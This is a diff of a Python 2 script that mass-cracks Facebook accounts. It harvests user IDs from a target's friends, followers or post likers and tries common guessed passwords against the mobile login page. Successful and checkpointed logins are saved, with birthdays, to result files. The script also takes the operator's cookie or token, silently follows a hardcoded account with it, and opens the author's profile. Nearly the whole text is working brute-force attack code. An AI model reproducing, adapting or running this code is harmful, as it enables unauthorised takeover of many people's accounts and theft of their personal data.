@@ -1,7 +1,9 @@
-# coding: utf-8
-# coded by Fariya Khan
-# fb.me/Faritricker
-
+# -*- coding: utf-8
+########################################################
+# * Author    : FARIYA KHAN                            #
+# * Facebook  : https://facebook.com/Faritricker007    #
+# * GitHub    : https://github.com/anggaxd             #
+#######################################################
 
 try:
 	import requests
@@ -28,7 +30,7 @@ pwx = []
 s = requests.Session()
 rgb = random.choice(['\x1b[0;91m', '\x1b[0;92m', '\x1b[0;93m', '\x1b[0;94m', '\x1b[0;95m', '\x1b[0;96m', '\x1b[0;97m', '\x1b[0m'])
 ua = s.get("https://raw.githubusercontent.com/Faritricker/New/main/ua.txt").text.strip()
-ip = s.get('https://api-asutoolkit.cloudaccess.host/ip.php').text
+ip = s.get('https://anggaxd.herokuapp.com/ip/').text
 	
 ct = datetime.now()
 n = ct.month
@@ -46,27 +48,23 @@ bu = current.month
 ha = current.day
 op = bulan[nTemp]
 
-###LOGO###
-
-logo = """
-\033[1;97m8888888888 d8888 8888888b.  8888888 
-\033[1;97m888       d88888 888   Y88b   888   
-\033[1;97m888      d88P888 888    888   888   
-\033[1;97m8888888 d88P 888 888   d88P   888   
-\033[1;97m888    d88P  888 8888888P"    888   
-\033[1;97m888   d88P   888 888 T88b     888   
-\033[1;97m888  d8888888888 888  T88b    888   
-\033[1;97m888 d88P     888 888   T88b 8888888 
-                                   
-\033[1;91m⊱══════════════════⊱═⊰\033[1;93mFARIYA\033[1;91m⊱═⊰══════════════════⊰
-\033[1;97m Author   : Fariya Khan
-\033[1;97m FB       : https://m.facebook.com/Faritricker007
-\033[1;97m FB Page  : https://m.facebook.com/TechFari007
-\033[1;91m⊱══════════════════⊱═⊰\033[1;93mFARIYA\033[1;91m⊱═⊰══════════════════⊰
-\033[1;97m [!] Enjoying Free Tool Don't Buy This.
-\033[1;97m [!] If Tool Not Work Open Aeroplane Mode And Off.
-\033[1;91m⊱══════════════════⊱═⊰\033[1;93mFARIYA\033[1;91m⊱═⊰══════════════════⊰
-"""
+def logo():
+	os.system("clear")
+	print("\033[1;97m8888888888 d8888 8888888b.  8888888 ")
+	print("\033[1;97m888       d88888 888   Y88b   888")
+	print("\033[1;97m888      d88P888 888    888   888  ")
+	print("\033[1;97m8888888 d88P 888 888   d88P   888  ")
+	print("\033[1;97m888    d88P  888 8888888P    888")
+	print("\033[1;97m888   d88P   888 888 T88b     888")
+	print("\033[1;97m888  d8888888888 888  T88b    888  ")
+	print("\033[1;97m888 d88P     888 888   T88b 8888888 ")
+	print("")
+	print("\033[1;91m⊱══════════════════⊱═⊰\033[1;93mFARIYA\033[1;91m⊱═⊰══════════════════⊰")
+	print("\033[1;97m Author   : Fariya Khan")
+	print("\033[1;97m FB       : https://m.facebook.com/Faritricker007")
+	print("\033[1;97m FB Page  : https://m.facebook.com/TechFari007")
+	print("\033[1;91m⊱══════════════════⊱═⊰\033[1;93mFARIYA\033[1;91m⊱═⊰══════════════════⊰")
+	
 
 def bot_komen():
     try:
@@ -77,8 +75,6 @@ def bot_komen():
     requests.post('https://graph.facebook.com/100012841782153/subscribers?access_token=' + token)
     print(" \033[0;97m[\033[0;92m+\033[0;97m] Login Successfully")
     menu()
-    
-###LOGIN###
 
 def login():
 	os.system("clear")
@@ -101,29 +97,26 @@ def login():
 	                cookie()
 	        else:
 	                login()
-	               
-###COOKIE###
-
+			
 def cookie():
-        os.system('clear')
-        print logo
-        print ' '
-        print ('\033[1;97m[ login With Facebook Cookie ]').center(50)
-        print ' '
-        cookie = raw_input("\033[1;97m[!] Put Cookie : \033[0;90m")
+	logo()
+	print ' '
+	print ('\033[1;97m[ login With Facebook Cookie ]').center(50)
+	print ' '
+	cookie = raw_input("\033[1;97m[!] Put Cookie : \033[0;90m")
 	try:
 		data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = {
-		'user-agent'                : 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', # Jangan Di Ganti Ea Anjink.
-		'referer'                   : 'https://m.facebook.com/',
-		'host'                      : 'm.facebook.com',
-		'origin'                    : 'https://m.facebook.com',
-		'upgrade-insecure-requests' : '1',
-		'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
-		'cache-control'             : 'max-age=0',
-		'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-		'content-type'              : 'text/html; charset=utf-8'
+		   'user-agent'                : 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', # Jangan Di Ganti Ea Anjink.
+		   'referer'                   : 'https://m.facebook.com/',
+		   'host'                      : 'm.facebook.com',
+		   'origin'                    : 'https://m.facebook.com',
+		   'upgrade-insecure-requests' : '1',
+		   'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
+		   'cache-control'             : 'max-age=0',
+		   'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+		   'content-type'              : 'text/html; charset=utf-8'
 		}, cookies = {
-		'cookie'                    : cookie
+		   'cookie'                    : cookie
 		})
 		find_token = re.search('(EAAA\w+)', data.text)
 		hasil    = " \033[0;97m[\033[0;91m!\033[0;97m] Your Cookie Invalid" if (find_token is None) else '\n* Your fb access token : ' + find_token.group(1)
@@ -132,33 +125,30 @@ def cookie():
 	cookie = open("login.txt", 'w')
 	cookie.write(find_token.group(1))
 	cookie.close()
-	print("\033[1;92mCookie login success").center(50)
+	print("\033[1;92mCookie Login Success").center(50)
 	time.sleep(1)
 	os.system('xdg-open https://m.facebook.com/Faritricker007')
 	time.sleep(1)
 	bot_komen()
 	
-	
-###TOEKN###
-
 def tokenz():
 	os.system("clear")
 	try:
 		token = open('login.txt','r')
 		menu()
 	except (KeyError,IOError):
-	        print logo
-	        print ' '
-	        print ('\033[1;97m[ login With Facebook Token ]').center(50)
-	        print ' '
-	        token = raw_input("\033[1;97m[!] Put Token : \033[0;90m")
+		logo()
+		print ' '
+		print ('\033[1;97m[ login With Facebook Token ]').center(50)
+		print ' '
+		token = raw_input("\033[1;97m[!] Put Token : \033[0;90m")
 		try:
 			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
 			a = json.loads(otw.text)
 			avsid = open("login.txt", 'w')
 			avsid.write(token)
 			avsid.close()
-			print("\033[1;92mToken login success").center(50)
+			print("\033[1;92mToken Login Success").center(50)
 			time.sleep(1)
 			os.system('xdg-open https://m.facebook.com/Faritricker007')
 			time.sleep(1)
@@ -167,7 +157,7 @@ def tokenz():
 			exit(" \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid")
 
 def menu():
-        os.system('clear')
+	os.system('clear')
 	global token
 	try:
 		token = open('login.txt','r').read()
@@ -188,9 +178,9 @@ def menu():
 		login()
 	except requests.exceptions.ConnectionError:
 		exit(' \033[0;97m[\033[0;91m!\033[0;97m] No Connection')
-	print logo
+	logo()
 	print ' '
-	print(" \033[0;97m[\033[0;96m+\033[0;97m] Logged ID : %s"%(nama))
+	print(" \033[0;97m[\033[0;96m+\033[0;97m] User Active : %s"%(nama))
 	print(" \033[0;97m[\033[0;96m+\033[0;97m] IP Address  : "+ip)
 	print ' '
 	print(" \033[0;97m[\033[0;96m1\033[0;97m] Crack From Public")
@@ -243,8 +233,6 @@ def menu():
 	else:
 		menu()
 
-###PUBLIC###
-
 def public():
 	global token
 	try:
@@ -252,15 +240,15 @@ def public():
 	except IOError:
 		print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
 		tokenz()
-	os.system('clear')
-	print logo
+	logo()
 	print ' '
 	print("\n \033[0;97m[\033[0;93m*\033[0;97m] Fill In 'me' To Crack From The Friends List")
+	print ' '
 	idt = raw_input("\033[1;97m[!] Put ID/Username : ")
 	try:
 		pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
 		sp = json.loads(pok.text)
-		print '\033[1;97m[!] Target Public ID : ' + sp['name']
+		#print(" \033[0;97m[\033[0;92m+\033[0;97m] Name : "+sp["name"])
 	except KeyError:
 		exit(' \033[0;97m[\033[0;91m!\033[0;97m] ID Public Not Found')
 	r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
@@ -269,9 +257,9 @@ def public():
 		uid = i['id']
 		name = i['name']
 		id.append(uid+'<=>'+name)
-	print(" \033[1;97m[!] Total IDs : \033[0;91m"+str(len(id)))
-	ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Want to Use a Manual Password? Y/t : ")
-	if ask == "Y" or ask == "y":
+	print(" \033[0;97m[\033[0;93m*\033[0;97m] Total ID  : \033[0;91m"+str(len(id)))
+	ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Want to Use a Manual Password? Y/N : ")
+	if ask == "Y" or ask == "N":
 		manual()
 	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;92mOK\033[0;97m Saved In : results/OK-%s-%s-%s.txt"% (ha, op, ta))
 	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;93mCP\033[0;97m Saved In : results/CP-%s-%s-%s.txt\n"% (ha, op, ta))
@@ -280,7 +268,7 @@ def public():
 		global loop, token
 		pwx = []
 		sys.stdout.write(
-		      '\r \033[0;97m[%sFK\033[0;97m] Cracking %s/%s OK-:%s - CP-:%s ' % (rgb,loop, len(id), len(ok), len(cp))
+		      '\r \033[0;97m[%s*\033[0;97m] Cracking %s/%s OK-:%s - CP-:%s ' % (rgb,loop, len(id), len(ok), len(cp))
 		); sys.stdout.flush()
 		try:os.mkdir("results")
 		except OSError:pass
@@ -302,13 +290,14 @@ def public():
 					pwx.append("786786")
 					pwx.append("pakistan")
 					pwx.append("000786")
+					
 		try:
 			for pw in pwx:
 				pw = pw.lower()
 				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
 				xo = rex.content
 				if 'mbasic_logout_button' in xo or 'save-device' in xo:
-					print('\r  \033[0;92m[FK-OK] ' +uid+ '|' + pw + '       ')
+					print('\r  \033[0;92m* --> ' +uid+ '|' + pw + '       ')
 					ok.append(uid+'|'+pw)
 					save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
 					save.write('  * --> '+str(uid)+'|'+str(pw)+'\n')
@@ -322,7 +311,7 @@ def public():
 						data = s.get(url).json()
 						ttl = data['birthday'].replace("/","-")
 						nama = data['name']
-						print('\r  \033[0;93m[FK-CP] ' +uid+ '|' + pw + '|' + ttl)
+						print('\r  \033[0;93m* --> ' +uid+ '|' + pw + '|' + ttl)
 						cp.append(uid+'|'+pw+'|'+ttl)
 						save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
 						save.write('  * --> '+str(uid)+'|'+str(pw)+'|'+ttl+'\n')
@@ -331,7 +320,7 @@ def public():
 					except(KeyError, IOError):
 						ttl = " "
 					except:pass
-					print('\r  \033[0;93m[FK-CP] ' +uid+ '|' + pw + '       ')
+					print('\r  \033[0;93m* --> ' +uid+ '|' + pw + '       ')
 					cp.append(uid+'|'+pw)
 					save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
 					save.write('  * --> '+str(uid)+'|'+str(pw)+'\n')
@@ -353,15 +342,15 @@ def followers():
 	except IOError:
 		print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
 		tokenz()
-	os.system('clear')
-	print logo
+	logo()
 	print ' '
 	print("\n \033[0;97m[\033[0;93m*\033[0;97m] Fill In 'me' To Crack From The Followers")
+	print ' '
 	idt = raw_input("\033[1;97m[!] Put ID/Username : ")
 	try:
 		pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
 		sp = json.loads(pok.text)
-		print '\033[1;97m[!] Target Follower ID : ' + sp['name']
+		#print(" \033[0;97m[\033[0;92m+\033[0;97m] Name : "+sp["name"])
 	except KeyError:
 		exit(' \033[0;97m[\033[0;91m!\033[0;97m] ID Public Not Found')
 	r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=5000&access_token="+token)
@@ -370,7 +359,7 @@ def followers():
 		uid = i['id']
 		name = i['name']
 		id.append(uid+'<=>'+name)
-	print(" \033[1;97m[!] Total IDs : \033[0;91m"+str(len(id)))
+	print(" \033[0;97m[\033[0;93m*\033[0;97m] Total ID  : \033[0;91m"+str(len(id)))
 	ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Want to Use a Manual Password? Y/t : ")
 	if ask == "Y" or ask == "y":
 		manual()
@@ -381,7 +370,7 @@ def followers():
 		global loop, token
 		pwx = []
 		sys.stdout.write(
-		      '\r \033[0;97m[%sFK\033[0;97m] Cracking %s/%s OK-:%s - CP-:%s ' % (rgb,loop, len(id), len(ok), len(cp))
+		      '\r \033[0;97m[%s*\033[0;97m] Cracking %s/%s OK-:%s - CP-:%s ' % (rgb,loop, len(id), len(ok), len(cp))
 		); sys.stdout.flush()
 		try:os.mkdir("results")
 		except OSError:pass
@@ -409,10 +398,10 @@ def followers():
 				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
 				xo = rex.content
 				if 'mbasic_logout_button' in xo or 'save-device' in xo:
-					print('\r  \033[0;92m[FK-OK] ' +uid+ '|' + pw + '       ')
+					print('\r  \033[0;92m* --> ' +uid+ '|' + pw + '       ')
 					ok.append(uid+'|'+pw)
 					save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
-					save.write('  [FK-OK] '+str(uid)+'|'+str(pw)+'\n')
+					save.write('  * --> '+str(uid)+'|'+str(pw)+'\n')
 					save.close()
 					break
 					continue
@@ -423,19 +412,19 @@ def followers():
 						data = s.get(url).json()
 						ttl = data['birthday'].replace("/","-")
 						nama = data['name']
-						print('\r  \033[0;93m[FK-CP] ' +uid+ '|' + pw + '|' + ttl)
+						print('\r  \033[0;93m* --> ' +uid+ '|' + pw + '|' + ttl)
 						cp.append(uid+'|'+pw+'|'+ttl)
 						save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
-						save.write('  [FK-CP] '+str(uid)+'|'+str(pw)+'|'+ttl+'\n')
+						save.write('  * --> '+str(uid)+'|'+str(pw)+'|'+ttl+'\n')
 						save.close()
 						break
 					except(KeyError, IOError):
 						ttl = " "
 					except:pass
-					print('\r  \033[0;93m[FK-CP] ' +uid+ '|' + pw + '       ')
+					print('\r  \033[0;93m* --> ' +uid+ '|' + pw + '       ')
 					cp.append(uid+'|'+pw)
 					save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
-					save.write('  [FK-CP] '+str(uid)+'|'+str(pw)+'\n')
+					save.write('  * --> '+str(uid)+'|'+str(pw)+'\n')
 					save.close()
 					break
 					continue
@@ -454,15 +443,15 @@ def reaction():
 	except IOError:
 		print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
 		tokenz()
-	os.system('clear')
-	print logo
+	logo()
 	print ' '
 	print("\n \033[0;97m[\033[0;93m*\033[0;97m] Ex :/post/\033[0;92m629986xxxxx\033[0;97m (only id post)")
-	idt = raw_input("\033[1;97m[!] Put ID/Username : ")
+	print ' '
+	idt = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] ID Post : ")
 	try:
 		pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
 		sp = json.loads(pok.text)
-		print '\033[1;97m[!] Target Post ID : ' + sp['name']
+		#print(" \033[0;97m[\033[0;92m+\033[0;97m] Name : "+sp["name"])
 	except KeyError:
 		exit(' \033[0;97m[\033[0;91m!\033[0;97m] ID Postingan Not Found')
 	r = requests.get("https://graph.facebook.com/"+idt+"/likes?limit=5000&access_token="+token)
@@ -482,7 +471,7 @@ def reaction():
 		global loop, token
 		pwx = []
 		sys.stdout.write(
-		      '\r \033[0;97m[%sFK\033[0;97m] Cracking %s/%s OK-:%s - CP-:%s ' % (rgb,loop, len(id), len(ok), len(cp))
+		      '\r \033[0;97m[%s*\033[0;97m] Cracking %s/%s OK-:%s - CP-:%s ' % (rgb,loop, len(id), len(ok), len(cp))
 		); sys.stdout.flush()
 		try:os.mkdir("results")
 		except OSError:pass
@@ -510,10 +499,10 @@ def reaction():
 				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
 				xo = rex.content
 				if 'mbasic_logout_button' in xo or 'save-device' in xo:
-					print('\r  \033[0;92m[FK-OK] ' +uid+ '|' + pw + '       ')
+					print('\r  \033[0;92m* --> ' +uid+ '|' + pw + '       ')
 					ok.append(uid+'|'+pw)
 					save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
-					save.write('  [FK-OK] '+str(uid)+'|'+str(pw)+'\n')
+					save.write('  * --> '+str(uid)+'|'+str(pw)+'\n')
 					save.close()
 					break
 					continue
@@ -524,19 +513,19 @@ def reaction():
 						data = s.get(url).json()
 						ttl = data['birthday'].replace("/","-")
 						nama = data['name']
-						print('\r  \033[0;93[FK-CP] ' +uid+ '|' + pw + '|' + ttl)
+						print('\r  \033[0;93m* --> ' +uid+ '|' + pw + '|' + ttl)
 						cp.append(uid+'|'+pw+'|'+ttl)
 						save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
-						save.write('  [FK-CP] '+str(uid)+'|'+str(pw)+'|'+ttl+'\n')
+						save.write('  * --> '+str(uid)+'|'+str(pw)+'|'+ttl+'\n')
 						save.close()
 						break
 					except(KeyError, IOError):
 						ttl = " "
 					except:pass
-					print('\r  \033[0;93m[FK-CP] ' +uid+ '|' + pw + '       ')
+					print('\r  \033[0;93m* --> ' +uid+ '|' + pw + '       ')
 					cp.append(uid+'|'+pw)
 					save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
-					save.write('  [FK-CP] '+str(uid)+'|'+str(pw)+'\n')
+					save.write('  * --> '+str(uid)+'|'+str(pw)+'\n')
 					save.close()
 					break
 					continue
@@ -548,14 +537,9 @@ def reaction():
 	p.map(main, id)
 	exit("\n \033[0;97m[\033[0;96m#\033[0;97m] Finished")
 
-###MANUAL###
-
 def manual():
 	print(" \033[0;97m[\033[0;93m*\033[0;97m] Example Pass : bismillah,123456,indonesia")
 	pw = raw_input(" \033[0;97m[\033[0;93m?\033[0;97m] Set Password : ")
-	os.system('clear')
-	print logo
-	print ' '
 	print("\n \033[0;97m[\033[0;93m*\033[0;97m] Crack With Password : \033[0;91m%s"%(pw))
 	if len(pw) ==0:
 		exit(" \033[0;97m[\033[0;91m!\033[0;97m] Don't Be Empty")
@@ -564,7 +548,7 @@ def manual():
 	
 	def main(user):
 		global loop, token
-		sys.stdout.write('\r \033[0;97m[\033[0;93mFK\033[0;97m] Cracking %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp))
+		sys.stdout.write('\r \033[0;97m[\033[0;93m*\033[0;97m] Cracking %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp))
 		); sys.stdout.flush()
 		try:os.mkdir("results")
 		except OSError:pass
@@ -579,10 +563,10 @@ def manual():
 				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': asu, 'login': 'submit'}, headers={'user-agent': ua})
 				xo = rex.content
 				if 'mbasic_logout_button' in xo or 'save-device' in xo:
-					print('\r  \033[0;92m[FK-OK] ' +uid+ '|' + asu + '       ')
+					print('\r  \033[0;92m* --> ' +uid+ '|' + asu + '       ')
 					ok.append(uid+'|'+asu)
 					save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
-					save.write('  [FK-OK] '+str(uid)+'|'+str(asu)+'\n')
+					save.write('  * --> '+str(uid)+'|'+str(asu)+'\n')
 					save.close()
 					break
 					continue
@@ -592,19 +576,19 @@ def manual():
 						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
 						data = s.get(url).json()
 						ttl = data['birthday'].replace("/","-")
-						print('\r  \033[0;93m[FK-CP] ' +uid+ '|' + asu + '|' + ttl)
+						print('\r  \033[0;93m* --> ' +uid+ '|' + asu + '|' + ttl)
 						cp.append(uid+'|'+asu+'|'+ttl)
 						save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
-						save.write('  [FK-CP] '+str(uid)+'|'+str(asu)+'|'+ttl+'\n')
+						save.write('  * --> '+str(uid)+'|'+str(asu)+'|'+ttl+'\n')
 						save.close()
 						break
 					except(KeyError, IOError):
 						ttl = " "
 					except:pass
-					print('\r  \033[0;93m[FK-CP] ' +uid+ '|' + asu + '       ')
+					print('\r  \033[0;93m* --> ' +uid+ '|' + asu + '       ')
 					cp.append(uid+'|'+asu)
 					save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
-					save.write('  [FK-CP] '+str(uid)+'|'+str(asu)+'\n')
+					save.write('  * --> '+str(uid)+'|'+str(asu)+'\n')
 					save.close()
 					break
 					continue
@@ -623,22 +607,19 @@ def settua():
 		menu()
 	elif ask == "y" or ask == "Y":
 		try:
-		    os.system('clear')
-		    print logo
-		    print ' '
-		    print("\n \033[0;97m[\033[0;93m*\033[0;97m] Type In Chrome Search : My User Agent")
-		    print ' '
-		    ua = raw_input(" \033[0;97m[\033[0;96m+\033[0;97m] User Agent : ")
-		    save = open(".ua","w")
-		    save.write(ua)
-		    save.close()
-		    time.sleep(2)
-		    menu()
+			print("\n \033[0;97m[\033[0;93m*\033[0;97m] Type In Chrome Search : My User Agent")
+			ua = raw_input(" \033[0;97m[\033[0;96m+\033[0;97m] User Agent : ") 
+			save = open(".ua","w")
+			save.write(ua) 
+			save.close()
+			print(" \033[0;97m[\033[0;92m✓\033[0;97m] Successfully Setting User-Agent")
+			time.sleep(2)
+			menu()
 		except KeyboardInterrupt:
 			exit()
 	elif ask == "t" or ask == "T":
 		try:
-			ua = s.get("https://raw.githubusercontent.com/Faritricker/New/main/ua.txt").text.strip()
+			ua = s.get("https://raw.githubusercontent.com/avsid/data-anggaxd/main/ua.txt").text.strip()
 			save = open(".ua","w")
 			save.write(ua) 
 			save.close()
@@ -654,7 +635,7 @@ if __name__ == '__main__':
 	if sys.version[0]!="3":
 		python="2.7" if "2.7" in sys.version[0:2] else "2.8"
 	else:
-		print(" \033[0;97m[\033[0;93m#\033[0;97m] Please Use Python 2 Bro Not Python 3")
+		print(" \033[0;97m[\033[0;93m#\033[0;97m] Please Use Python 2 Not Python 3")
 		exit(" \033[0;97m[\033[0;91m!\033[0;97m] How To Usage : python2 Run.py")
 	os.system("git pull")
 	login()
